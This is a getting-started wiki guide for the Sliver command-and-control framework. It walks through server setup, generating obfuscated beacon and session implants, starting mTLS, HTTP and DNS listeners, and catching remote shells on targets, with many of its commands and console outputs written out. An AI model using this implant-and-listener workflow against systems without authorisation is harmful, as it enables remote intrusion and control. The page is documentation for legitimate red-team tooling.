

__⚠️ NOTE:__ This guide is intended for experienced red teamers, please see the [Beginner's Guide](https://github.com/BishopFox/sliver/wiki/Beginner's-Guide) for a more beginner friendly tutorial.

## Server Setup

The first thing you'll need to do is setup a Sliver server, Sliver is designed for a one server deployment per-operation.

The server supports Linux, Windows, and MacOS however we strongly recommend running the server on a Linux (or MacOS, well really anything that isn't Windows), as some features may be more difficult to get working on a Windows server. The Windows client should work just fine when accessing a Linux/MacOS server from Windows, if for some odd reason your operators want to actually use Windows you'll just need to setup [multiplayer mode](https://github.com/BishopFox/sliver/wiki/Multiplayer-Mode).

Download the latest sever [release](https://github.com/BishopFox/sliver/releases) for your platform, and just run the binary.

__IMPORTANT:__ Sliver has two external dependancies for _optional_ features: MinGW and Metasploit. To enable DLL payloads you need to install MinGW. To enable some MSF integrations you'll need Metasploit installed on the server.

### MinGW Setup (Optional, Recommended)

In order to enable shellcode/staged/DLL payloads you'll need to install MinGW on the server (clients connecting to the server do not need it installed). By default Sliver will look in the usual places for MinGW binaries but you can override this using the [environment variables](https://github.com/BishopFox/sliver/wiki/Environment-Variables).

#### Linux (Debian-based)

```
apt install mingw-w64
```

#### MacOS

```
brew install mingw-w64
```

__Note:__ On MacOS may have to configure [environment variables](https://github.com/BishopFox/sliver/wiki/Environment-Variables) for MinGW.

### Metasploit Setup (Optional)

We strongly recommend using the [nightly framework installers](https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers), Sliver expects version 5 or later.

## Implants Beacon vs. Session

__IMPORTANT:__ The first time you generate an implant the server needs to download some Go module code, so the server must have internet access. See [offline implant builds](https://github.com/BishopFox/sliver/wiki/Offline-Implant-Builds) if this is a problem for you. The modules are cached.

Sliver is generally designed as a stage 2 payload, and as such we've not yet endeavored to minimize the implant's file size. Depending on how many protocols you enable in your implant the file can get large, we strongly advise the use of [stagers](https://github.com/BishopFox/sliver/wiki/Stagers) for actual operations. Such is the tradeoff for getting easy static compilation in Golang.

Sliver implants in v1.5 and later support two implant modes of operation: "beacon mode" and "session mode." Beacon mode implements an asynchronous communication style where the implant periodically checks in with the server retrieves tasks, executes them, and returns the results. In "session mode" the implant will create an interactive real time session using either a persistent connection or using long polling depending on the underlying C2 protocol. 

Beacons may be tasked to open interactive sessions over _any C2 protocol they were compiled with_ using the `interactive` command, i.e., if a beacon implant was not compiled with HTTP C2 it cannot open a session over HTTP (use the `close` command to close the session). However, currently implants initially compiled for session mode cannot be converted to beacon. Take this into account during operational planning.

Some commands such as `shell` and `portfwd` only work over interactive sessions.

## Generating Implants

Generating implants is done using the `generate` command, you must specify at least one C2 endpoint using `--mtls`, `--wg`, `--http`, or `--dns`. Note that when an implant attempts to connect to an endpoint specified using `--http` it will try both HTTPS and then HTTP (if HTTPS fails). We recommend using mTLS (`--mtls`) or WireGuard (`--wg`) whenever possible. You can also specify an output directory with `--save`, by default the implant will be saved to the current working directory.

#### Session Mode

```
[server] sliver > generate --mtls example.com --save /Users/moloch/Desktop

[*] Generating new windows/amd64 Sliver binary
[*] Build completed in 00:00:16
[*] Sliver binary saved to: /Users/moloch/Desktop/NEW_GRAPE.exe
```

#### Beacon Mode

```
[server] sliver > generate beacon --mtls example.com --save /Users/moloch/Desktop

[*] Generating new windows/amd64 beacon implant binary (1m0s)
[*] Symbol obfuscation is enabled
[*] Build completed in 00:00:27
[*] Implant saved to /Users/moloch/Desktop/FINE_SENTENCE.exe
```

Sliver implants are cross-platform, you can change the compiler target with the `--os` flag. Sliver accepts any Golang GOOS and GOARCH as arguments `--os` and `--arch`, we officially only support Windows, MacOS, and Linux, but you can at least attempt to compile for any other [valid Golang GOOS/GOARCH](https://gist.github.com/asukakenji/f15ba7e588ac42795f421b48b8aede63) combination. The `generate info` command will also estimate what compiler targets can be used based on the server's host operating system and available cross-compilers.

Some commands/features may not work on "unsupported" platforms.

```
sliver > generate --mtls example.com --save /Users/moloch/Desktop --os mac

[*] Generating new darwin/amd64 Sliver binary
[*] Build completed in 00:00:09
[*] Sliver binary saved to: /Users/moloch/Desktop/PROPER_ANTHONY
```

The server will also assign code names to each generated binary i.e. `NEW_GRAPE.exe` you can rename the file to anything you need to, but these code names will still uniquely identify the generated binary (they're inserted at compile-time). You can also view all previously generated implant binaries with the `implants` command:

```
sliver > implants

Name                    OS/Arch        Debug  Format
====                    =======        =====  ======
CAUTIOUS_PANPIPE        darwin/amd64   false  EXECUTABLE
LATE_SUBCOMPONENT       windows/amd64  false  SHARED_LIB
RUBBER_PRINTER          windows/amd64  true   SHARED_LIB
RACIAL_SPECTACLES       darwin/amd64   false  EXECUTABLE
MATHEMATICAL_SASH       darwin/amd64   true   SHARED_LIB
MUSHY_TRADITIONALISM    windows/amd64  false  SHARED_LIB
SICK_SPY                darwin/amd64   false  EXECUTABLE
```

If you need to re-download a previously generated implant use the `regenerate` command, note that positional arguments (the implant name) comes after the command flags (e.g., `--save`):

```
sliver > regenerate --save /Users/moloch/Desktop NEW_GRAPE

[*] Sliver binary saved to: /Users/moloch/Desktop/NEW_GRAPE.exe
```

#### Additional Details

For addition details about each C2 please see:
* [HTTP(S) C2](https://github.com/BishopFox/sliver/wiki/HTTP(S)-C2)
* [DNS C2](https://github.com/BishopFox/sliver/wiki/DNS-C2)

## Getting Shells

Before you can catch the shell, you'll first need to start a listener. You use the commands `mtls`, `http`, `https`, and `dns` to start listeners for each protocol (remember endpoints specified with `--http` can connect to a listener started with `https`). You can use the `jobs` command to view and manage listeners running in the background. Listeners support both sessions and beacons callbacks:

```
sliver > mtls

[*] Starting mTLS listener ...
[*] Successfully started job #1

sliver > jobs

ID  Name  Protocol  Port
==  ====  ========  ====
1   mTLS  tcp       8888
```

In this example we're using Mutual TLS, the required certificates for setting up and securing this connection have already been generated in the background and the client certificate pair was embedded into the implant at compile-time. So to get a shell you just have to run the binary on the target.

```
[*] Session #1 PROPER_ANTHONY - 127.0.0.1:49929 (narvi.local) - darwin/amd64

sliver > use 1

[*] Active sliver PROPER_ANTHONY (1)

sliver (PROPER_ANTHONY) > ls

/Users/moloch/Desktop
=====================
.DS_Store                 6.0 KiB
.localized                0 B
PROPER_ANTHONY            6.3 MiB
```

If you're having problems getting callbacks please see our [troubleshooting guide](https://github.com/BishopFox/sliver/wiki/Troubleshooting#implant-troubleshooting), (TL;DR add the `--debug` flag when generating an implant).

## Multiple Domains/Protocols

You can specify multiple domains and protocols during the generation process. Right now Sliver will attempt to use the most performant protocols first (MTLS -> WG -> HTTP(S) -> DNS) using subsequent domains/protocols when connections fail.

```
sliver > generate --mtls example.com --http foobar.com --dns 1.lil-peep.rip
```

Eventually we'll add a feature to manually specify the fallback protocols, or you can add this feature and send up a PR :).

## What Next?

Most commands have a `--help` and support tab complete, you may also find the following wiki articles of interest:

* [Stagers](https://github.com/BishopFox/sliver/wiki/Stagers)
* [Port Forwarding](https://github.com/BishopFox/sliver/wiki/Port-Forwarding)
* [Reverse SOCKS](https://github.com/BishopFox/sliver/wiki/Reverse-SOCKS)
* [BOF/COFF Support](https://github.com/BishopFox/sliver/wiki/BOF-&-COFF-Support)